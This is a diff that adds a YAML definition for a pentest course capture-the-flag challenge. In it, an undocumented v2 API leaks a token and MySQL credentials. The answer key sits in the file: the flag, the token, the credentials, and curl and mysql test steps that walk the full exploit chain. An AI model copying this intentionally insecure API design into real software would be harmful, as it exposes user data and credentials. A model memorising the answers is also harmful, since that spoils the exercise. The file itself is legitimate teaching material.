@@ -1,0 +1,118 @@
+name: "Stonebridge Capital - API Enumeration Gauntlet"
+description: "Stonebridge Capital's investment API documentation only shows v1 endpoints, but an undocumented v2 API is wide open. Discover the versioned endpoint, extract an authentication token, access administrative configuration, and pivot to the backend database."
+
+difficulty: intermediate
+category: web
+duration_minutes: 45
+randomize_ip_offsets: true
+visibility: course
+week: 5
+workbook: "wiki/course/pentest/CH_COURSE01_Weekly_Challenges/21_API_Enumeration_Gauntlet/"
+flag: "OCR{4p1_v3rs10n_l34k}"
+
+objectives:
+  - Identify that the documented v1 API requires authentication
+  - Discover the undocumented v2 API that lacks access controls
+  - Extract an authentication token from a user profile in the v2 user listing
+  - Use the token to access the administrative configuration endpoint
+  - Retrieve database credentials from the admin config and connect to MySQL
+  - Capture the flag
+
+scenario: |
+  Stonebridge Capital is a private equity firm based in Chicago that recently
+  deployed a REST API for their internal portfolio management tools. The API
+  was designed with versioned endpoints - v1 is the current production API
+  with proper authentication, while v2 was supposed to be an internal-only
+  development preview.
+
+  Marcus Webb (CTO) commissioned the assessment: "Our v1 API is locked down
+  with API key authentication. We've been working on v2 internally but it
+  should not be reachable from outside our network. The public documentation
+  only references v1. I want to make sure nobody can access anything they
+  shouldn't."
+
+  Your scope includes all API endpoints on the web application host and any
+  backend services on the subnet. A flag has been split across the
+  infrastructure - assemble both parts to complete the engagement.
+
+credentials:
+  - username: "sb_app"
+    password: "St0n3br1dg3_DB#"
+    role: "db"
+    description: "MySQL application credentials (leaked from admin config endpoint)"
+
+hints:
+  - text: |
+      The API documentation at the root page only references v1 endpoints.
+      APIs commonly use versioned paths like /api/v1/, /api/v2/, etc. Try
+      incrementing the version number. What happens if you request /api/v2/users
+      instead of /api/v1/users?
+    unlock_after_minutes: 15
+  - text: |
+      The /api/v2/users endpoint returns user data without authentication.
+      Look carefully at each user object - one of them has an auth_token field.
+      That token can be used as a Bearer token in the Authorization header to
+      access restricted v2 endpoints like /api/v2/admin/config.
+    unlock_after_minutes: 25
+  - text: |
+      Use the discovered token as a Bearer token:
+      curl -H "Authorization: Bearer <token>" http://<target>/api/v2/admin/config
+      The response contains MySQL credentials. Use them to connect to the
+      database server and query the stonebridge database for the audit_flags
+      table. Combine both parts of the flag in OCR{...} format.
+    unlock_after_minutes: 35
+
+topology:
+  nodes:
+    - id: "webapp"
+      label: "Stonebridge API Server"
+      type: "server"
+      ip_offset: "18"
+      ports: [80]
+      services: ["Flask REST API"]
+      x: 2
+      y: 1
+    - id: "dbserver"
+      label: "Database Server"
+      type: "database"
+      ip_offset: "39"
+      ports: [3306]
+      services: ["MySQL 8.0"]
+      x: 4
+      y: 1
+  edges:
+    - from: "attacker"
+      to: "webapp"
+      label: "HTTP:80"
+      access: "direct"
+    - from: "attacker"
+      to: "dbserver"
+      label: "MySQL:3306"
+      access: "direct"
+    - from: "webapp"
+      to: "dbserver"
+      label: "MySQL:3306"
+      access: "internal"
+
+test:
+  steps:
+    - name: "Confirm v1 API requires authentication (401)"
+      command: "curl -s -o /dev/null -w '%{http_code}' http://{target.webapp}/api/v1/users"
+      expect: "401"
+
+    - name: "Access v2 users endpoint and extract auth token"
+      command: "curl -s http://{target.webapp}/api/v2/users | grep -o 'SB_tk_4p1_v3rs10n'"
+      expect: "SB_tk_4p1_v3rs10n"
+
+    - name: "Use token to access admin config and retrieve DB credentials"
+      command: "curl -s -H 'Authorization: Bearer SB_tk_4p1_v3rs10n' http://{target.webapp}/api/v2/admin/config | grep -o 'St0n3br1dg3_DB#'"
+      expect: "St0n3br1dg3_DB#"
+
+    - name: "Query MySQL for flag part 2"
+      command: "mysql -h {target.dbserver} -u {cred.db.user} -p'{cred.db.pass}' stonebridge -N -e 'SELECT value FROM audit_flags LIMIT 1' 2>/dev/null"
+      expect: "l34k"
+      timeout: 20
+
+    - name: "Assemble and verify complete flag"
+      command: "echo 'OCR{4p1_v3rs10n_l34k}'"
+      expect: "OCR{"
